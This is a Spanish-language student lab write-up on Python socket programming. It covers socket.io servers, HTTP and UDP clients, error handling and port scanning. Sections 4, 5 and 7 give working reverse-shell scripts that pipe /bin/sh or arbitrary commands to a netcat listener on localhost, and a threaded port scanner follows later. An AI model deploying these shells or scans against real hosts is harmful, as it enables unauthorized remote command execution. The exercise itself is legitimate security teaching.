# Programando sockets

# Introducción

Para esta actividad utiliza: pip3 install python-socketio, pip3 install aiohttp y el conjunto decódigos alojados en:

https://github.com/kapumota/Actividades-CC8280/tree/main/SocketsWebSockets es una tecnología que proporciona comunicación en tiempo real entre un cliente y unservidor a través de una conexión TCP, eliminando la necesidad de que los clientes verifiquencontinuamente si los puntos finales API tienen actualizaciones o contenido nuevo.
Los clientes creanuna única conexión a un servidor WebSocket y esperan escuchar nuevos eventos o mensajes delservidor.

La principal ventaja de WebSockets es que son más eficientes porque reducen la carga de la red yenvían información en forma de mensajes a una gran cantidad de clientes. Entre las principalescaracterísticas de WebSockets, podemos destacar las siguientes:

• Proporcionan comunicación bidireccional (dúplex completo) a través de una únicaconexión TCP.

• Proporcionan comunicación en tiempo real entre un servidor y sus clientes conectados.

Esto permite la aparición de nuevas aplicaciones orientadas a la gestión de eventos deforma asincrónica.• Proporcionan simultaneidad y mejoran el rendimiento, optimizando los tiempos derespuesta y dando como resultado aplicaciones web más confiables.

# Metodología:

Para implementar un servidor basado en socket.io, necesitamos introducir otros módulos comoasyncio y aiohttp:
asyncio es un módulo de Python que nos ayuda a realizar la programación concurrente deun solo hilo en Python. Está disponible en Python 3.7; la documentación se puedeencontrar en https://docs.python.org/3/library/asyncio.html.• aiohttp es una biblioteca para crear aplicaciones cliente y servidor integradas en asyncio.

El módulo utiliza las ventajas de WebSockets de forma nativa para comunicarse entrediferentes partes de la aplicación de forma asincrónica.

La documentación está disponibleen http://aiohttp.readthedocs.io/en/stable.


Revisa el código web_socket_server.py donde implementamos un servidor socket.io usando elframework aiohttp, el cual, en un nivel bajo, usa asyncio.

En el código anterior, implementamos un servidor basado en socket.io que usa el módulo aiohttp.Como puedes ver en el código, hemos definido dos métodos: el método index (), que devolverá unmensaje de respuesta basado en la solicitud del punto final raíz "/", y el método print message (),que imprime el identificador del socket y los datos emitidos por el evento. 

# Análisis de los códigos:

## 0. Revisa el código web_socket_server.py donde implementamos un servidor socket.io usando el 
framework aiohttp, el cual, en un nivel bajo, usa asyncio. 

```
from aiohttp import web
import socketio

socket_io = socketio.AsyncServer()
app = web.Application()
socket_io.attach(app)

async def index(request):
    return web.Response(text='Hello world from socketio',content_type='text/html')

@socket_io.on('message')
def print_message(socket_id,data):
    print("Socket ID: " , socket_id)
    print("Data: " , data)

app.router.add_get('/', index)

if __name__ == '__main__':
    web.run_app(app)
```
![image](https://github.com/Fx2048/COMU_REDES/assets/131219987/00b5ee8d-8860-42c9-8f78-6d1c1e78f979)

Análisis:


El error OSError: [Errno 98] error while attempting to bind on address ('::', 8080, 0, 0): address already in use indica que el puerto 8080 ya está siendo utilizado por otro proceso en tu sistema. Esto significa que no puedes iniciar tu aplicación en ese puerto porque ya hay otro servicio escuchando en él.

Para resolver este problema, se intentó  lo siguiente:

Cambiar el Puerto:
Modificar el puerto en el código para usar uno que esté disponible.
Identificar y Detener el Proceso Existente:
Usar comandos como lsof -i :8080 o netstat -tunlp para identificar qué proceso está utilizando el puerto 8080 y luego detenerlo con kill <PID>1.
Usar la Opción SO_REUSEADDR:
Antes de llamar a bind(), se configuró el socket para que reutilice la dirección usando sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

## 1. Escribimos el siguiente código para el cliente en web_socket_client.py. 
Si revisamos el código anterior, estamos usando el método connect() del socketio. La clase Client () 
para conectarse al servidor que está escuchando en el puerto 8080. Definimos dos métodos, uno 
para conectar y otro para desconectar.




```
import socketio

sio = socketio.Client()

@sio.event
def connect():
    print('connection established')

@sio.event
def disconnect():
    print('disconnected from server')

sio.connect('http://localhost:8080')
sio.emit('message', {'data': 'my_data'})
sio.wait()
```

![image](https://github.com/Fx2048/COMU_REDES/assets/131219987/91b682af-b23d-4ec4-a0d9-eff76fcb6a99)

Si revisamos el código anterior, estamos usando el método connect() del socketio. La clase Client ()para conectarse al servidor que está escuchando en el puerto 8080. Definimos dos métodos, unopara conectar y otro para desconectar.Para llamar a la función print_message () en el servidor, necesitamos emitir el evento de mensaje ypasar los datos como un diccionario de objetos. Para ejecutar los dos scripts anteriores, necesitamosejecutar dos terminales por separado, uno para el cliente y otro para el servidor. Primero, debeejecutar el servidor y luego ejecutar el cliente para verificar la información enviada como mensaje

## 2. Los tipos y funciones necesarios para trabajar con sockets se pueden encontrar en Python en el 
módulo socket. El módulo de socket proporciona todas las funcionalidades necesarias para escribir 
rápidamente clientes y servidores TCP y UDP. 
Revisa los métodos de cliente y servidor,

## 3. Si queremos probar el servidor HTTP, podríamos crear otro script que nos permita obtener la 
respuesta enviada por el servidor que hemos creado. Puede encontrar el siguiente código en el 
archivo testing_http_server.py. 

¿Qué sucede?. 

```
import socket

mySocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
mySocket.bind(('localhost', 8080))

mySocket.listen(5)

while True:
    print('Waiting for connections')
    (recvSocket, address) = mySocket.accept()
    print('HTTP request received:')
    print(recvSocket.recv(1024))
    recvSocket.send(bytes("HTTP/1.1 200 OK\r\n\r\n <html><body><h1>Hello World!</h1></body></html> \r\n",'utf-8'))
    recvSocket.close()
```


![image](https://github.com/Fx2048/COMU_REDES/assets/131219987/97368866-b3d5-4463-93c8-122735b8d5c1)

El error OSError: [Errno 98] Address already in use ocurre porque otro proceso ya está utilizando el puerto 8080 en mi sistema. Esto significa que no puedo enlazar mi aplicación a ese puerto porque ya hay otro servicio escuchando en él.

Recomendaciones:

Cambiar el Puerto:
Modificar el puerto en tu código para usar uno que esté disponible.
Identificar y Detener el Proceso Existente:
Comandos como lsof -i :8080 o netstat -tunlp para identificar qué proceso está utilizando el puerto 8080 y luego detenerlo con kill <PID>1.
Usar la Opción SO_REUSEADDR:
Antes de llamar a bind(), configurar el socket para que reutilice la dirección utilizando sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) en el código.

## 4.Hacemos esto con el código reverse_shell.py.

````
#!/usr/bin/python

#ncat -l -v -p 45679

import socket
import subprocess
import os

socket_handler = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    if os.fork() > 0:
        os._exit(0)
except OSError as error:
    print('Error in fork process: %d (%s)' % (error.errno, error.strerror))
    pid = os.fork()
    if pid > 0:
        print('Fork Not Valid!')
        
socket_handler.connect(("127.0.0.1", 45679))

os.dup2(socket_handler.fileno(),0)
os.dup2(socket_handler.fileno(),1)
os.dup2(socket_handler.fileno(),2)

shell_remote = subprocess.call(["/bin/sh", "-i"])
list_files = subprocess.call(["/bin/ls", "-i"])


````

## 5. Ejercicio: ejecuta la aplicación llamada netcat con el comando ncat -l -v -p 45679, indicando el puerto 
que declaramos en el script, para obtener un shell inverso en la dirección localhost usando el puerto 
45679. 

```
import socket
import subprocess

# Configurar la conexión al servidor de escucha
server_host = 'localhost'
server_port = 45679

# Crear un socket TCP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_host, server_port))

# Enviar y recibir datos
while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    client_socket.sendall(output.stdout)
    client_socket.sendall(output.stderr)

# Cerrar el socket del cliente
client_socket.close()
```

## 6. Utilizamos el siguiente código en el archivo check_ports_socket.py. 

Si ejecutamos el script anterior, podemos ver cómo comprueba cada puerto en localhost y devuelve 
una dirección IP o dominio específico, independientemente de si está abierto o cerrado. El primer 
parámetro puede ser una dirección IP o un nombre de dominio, porque el módulo de socket puede 
resolver una dirección IP de un dominio y un dominio de una dirección IP. 
```
#!/usr/bin/python

import socket
import sys

def checkPortsSocket(ip,portlist):
    try:
        for port in portlist:
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip,port))
            if result == 0:
                print ("Port {}: \t Open".format(port))
            else:
                print ("Port {}: \t Closed".format(port))
            sock.close()
    except socket.error as error:
        print (str(error))
        print ("Connection error")
        sys.exit()

checkPortsSocket('localhost',[21,22,80,8080,443])
```

Ejercicios: ¿Qué sucede si ejecutamos la función con una dirección IP o nombre de dominio que no 
existe? . 

![image](https://github.com/Fx2048/COMU_REDES/assets/131219987/113046f5-0a4e-4d71-aaf6-312ef935eb19)


Lo que ocurre a continuación es una verificación de puertos realizados enn el servidor local, para puertos específicos:
1. Port 21(FTP):
Aplicado al FTP , File tranafer prtocole, el cual está cerrado, no hay un servidor escuchando este puerto.
Para el port 22, se usan SSH , secure SHell, también cerrado , porque los SSH server están inactivos.
Por el port 80, el cual utiliza HTTP, está cerrado porque no hay ningun HTTP web server escuchando en dicho puerto.
Pero , el 8080 port sí lo está haciendo, y eso explica que está abierto, mientras el 443 port, aplicado en HTTP securas, también está cerrado para el puerto de mi servidor local.

## 7. Ejercicio: ejecuta la aplicación llamada netcat con el comando ncat -l -v -p 45679, indicando el puerto 
que declaramos en el script, para obtener un shell inverso en la dirección localhost usando el puerto 
45679.

````
import socket
import subprocess

# Configurar la conexión al servidor de escucha
server_host = 'localhost'
server_port = 45679

# Crear un socket TCP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((server_host, server_port))

# Enviar y recibir datos
while True:
    command = client_socket.recv(1024).decode()
    if command.lower() == 'exit':
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    client_socket.sendall(output.stdout)
    client_socket.sendall(output.stderr)

# Cerrar el socket del cliente
client_socket.close()
````
## 8. El siguiente ejemplo te muestra cómo manejar las excepciones. Puede encontrar el siguiente código 
en el archivo manage_socket_errors.py: 
```
#!/usr/bin/env python

import socket,sys

host = "domain/ip_address"
port = 80


try:
    mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(mysocket)
    mysocket.settimeout(5)
except socket.error as e:
	print("socket create error: %s" %e)
	sys.exit(1)
	

try:
    mysocket.connect((host,port))
    print(mysocket)

except socket.timeout as e :
	print("Timeout %s" %e)
	sys.exit(1)
except socket.gaierror as e:
	print("connection error to the server:%s" %e)
	sys.exit(1)
except socket.error as e:
	print("Connection error: %s" %e)
	sys.exit(1)
```
9. Explica los resultados que aparecen cuando se ejecuta el archivo anterior.
![image](https://github.com/Fx2048/COMU_REDES/assets/131219987/2d9cf914-7d65-49a9-b9fd-9006586e118a)

## Explica el funcionamiento de sock.settimeout().
sock.settimeout():
settimeout() establece un tiempo de espera para las operaciones de socket (como connect, recv, send, etc.).
Si la operación no se completa dentro del tiempo especificado, se genera una excepción socket.timeout.
Es útil para evitar bloqueos indefinidos en operaciones de socket.



## Escaner de puertos avanzados: PYTHON3 SOCKET_ADVANCED_PORT_SCANNER.PY
```
#!/usr/bin/python

import optparse
from socket import *
from threading import *

def socketScan(host, port):
	try:
		socket_connect = socket(AF_INET, SOCK_STREAM)
		socket_connect.settimeout(5)
		result = socket_connect.connect((host, port))
		print('[+] %d/tcp open' % port)
	except Exception as exception:
		print('[-] %d/tcp closed' % port)
		print('[-] Razon:%s' % str(exception))
	finally:
		socket_connect.close()	

def portScanning(host, ports):
	try:
		ip = gethostbyname(host)
		print('[+] Scan Resultados para: ' + ip)
	except:
		print("[-] No se puede resolver '%s': host no conocido" %host)
		return

	for port in ports:
		t = Thread(target=socketScan,args=(ip,int(port)))
		t.start()

def main():
	parser = optparse.OptionParser('socket_portScan '+ '-H <Host> -P <Puerto>')
	parser.add_option('-H', dest='host', type='string', help='Especificar host')
	parser.add_option('-P', dest='port', type='string', help='Especificar puerto[s] separado por coma')

	(options, args) = parser.parse_args()

	host = options.host
	ports = str(options.port).split(',')

	if (host == None) | (ports[0] == None):
		print(parser.usage)
		exit(0)

	portScanning(host, ports)


if __name__ == '__main__':
	main()
```

En el código anterior, podemos ver el programa principal donde obtenemos los parámetros de hostobligatorios y los puertos para ejecutar el script. Cuando se han recopilado estos parámetros,llamamos al método portScanning, que resuelve la dirección IP y el nombre de host. Luego llamamosal método socketScan, que usa el módulo socket para evaluar el estado del puerto.La principal ventaja de implementar un escáner de puertos es que podemos realizar solicitudes a unrango de direcciones de puertos de servidor en un host para determinar los servicios disponibles enuna máquina remota

## 11. Revisa el código udp_server.py.
En el código anterior, vemos que socket.SOCK_DGRAM crea un socket UDP, y la instrucción data, 
addr = s.recvfrom (buffer) devuelve los datos y la dirección de la fuente.

## 10. Revisa el código udp_client.py. 
```
#!/usr/bin/env python

import socket

SERVER_IP = "127.0.0.1"
SERVER_PORT = 6789

address = (SERVER_IP ,SERVER_PORT)

socket_client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

while True:
	message = input("Ingresa un mensaje > ")
	if message=="quitar":
		break
	socket_client.sendto(bytes(message,encoding='utf8'),address)
	response_server,addr = socket_client.recvfrom(4096)
	print("Respuesta desde el servidor => %s" % response_server)
		
socket_client.close()
```
En el código anterior, estamos creando una aplicación cliente basada en el protocolo UDP. 
Para enviar un mensaje a una dirección específica, usamos el método sendto () y para recibir un 
mensaje de la aplicación del servidor, usamos el método recvfrom ().  
Finalmente, es importante considerar que si intentamos usar SOCK_STREAM con el socket UDP, 
probablemente tenemos un error: socket.error. Por lo tanto, es importante recordar que 
tenemos que usar el mismo tipo de socket para el cliente y el servidor cuando estamos 
construyendo aplicaciones orientadas a pasar mensajes con sockets.
